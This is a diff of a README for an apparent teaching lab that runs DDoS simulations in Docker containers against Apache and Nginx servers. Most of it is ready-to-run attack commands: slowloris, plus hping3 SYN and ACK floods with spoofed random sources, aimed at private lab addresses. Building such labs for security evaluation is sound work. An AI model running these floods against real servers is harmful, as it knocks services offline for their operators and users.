@@ -1,3 +1,17 @@
+# DDoS Attack Simulation Tool
+
+This project provides a set of tools to simulate DDoS attacks against Apache and Nginx servers for testing and security evaluation purposes.
+
+## Prerequisites
+
+- Docker and Docker Compose must be installed on your machine.
+
+## Usage
+
+1. Build and run the containers
+
+```bash
+docker-compose -f stack.yml up -d --build
 
 # build images and run containers
 
@@ -5,57 +19,65 @@
 docker-compose -f stack.yml up -d --build
 ```
 
-# --------------------------------------------------------------------------- #
-#                               HTTP flood attack                             # 
-# --------------------------------------------------------------------------- #
+2. HTTP Flood Attacks
 
-# Launch the slowloris(slow HTTP GET attack) attack against the apache-server
+- Slowloris attack against the Apache server
 
 ```bash
 docker exec -ti attacker-DDOS /bin/bash -c "slowloris 172.20.0.2 -s 1000"
 ```
 
-# Launch the slowloris(slow HTTP GET attack) attack against the nginx-server
+- Slowloris attack against the Nginx server
 
 ```bash
 docker exec -ti attacker-DDOS /bin/bash -c "slowloris 172.20.0.3 -s 1000"
 ```
-# --------------------------------------------------------------------------- #
-#                               SYN flood attack                              # 
-# --------------------------------------------------------------------------- #
 
-# Launch the SYN flood attack against the apache-server
+3. SYN Flood Attacks
+
+- SYN Flood attack against the Apache server
 
 ```bash
 docker exec -ti attacker-DDOS /bin/bash -c "hping3 -S -c 100000 -d 1000 -p 80 --flood  --rand-source 172.20.0.2"
 ```
 
-# Launch the SYN flood attack against the nginx-server
-
+- SYN Flood attack against the Nginx server
 ```bash
 docker exec -ti attacker-DDOS /bin/bash -c "hping3 -S -c 100000 -d 1000 -p 80 --flood  --rand-source 172.20.0.3"
 ```
 
-# --------------------------------------------------------------------------- #
-#                               ACK flood attack                              # 
-# --------------------------------------------------------------------------- #
+4. ACK Flood Attacks
 
-# Launch the ACK flood attack against the apache-server
-
+- ACK Flood attack against the Apache server
 ```bash
 docker exec -ti attacker-DDOS /bin/bash -c "hping3 -A -c 100000 -d 1000 -p 80 --flood  --rand-source 172.20.0.2"
 ```
 
-# Launch the ACK flood attack against the nginx-server
-
+- ACK Flood attack against the Nginx server
 ```bash
 docker exec -ti attacker-DDOS /bin/bash -c "hping3 -A -c 100000 -d 1000 -p 80 --flood  --rand-source 172.20.0.3"
 ```
 
-# stop and remove containers   
-
+5. Stop the containers
 ```bash
 docker-compose -f stack.yml down
 ```
+
+## Disclaimer
+
+This project is for educational purposes only. Do not use it for illegal purposes. The authors of this project are not responsible for any misuse of the information provided.
+
+## Auteur
+Ahmat Mahamat Ahmat
+Elaggoun Aref
+Fouché Stanislas
+Memar Ahmed
+
+## Licence
+
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+```
+
 
  
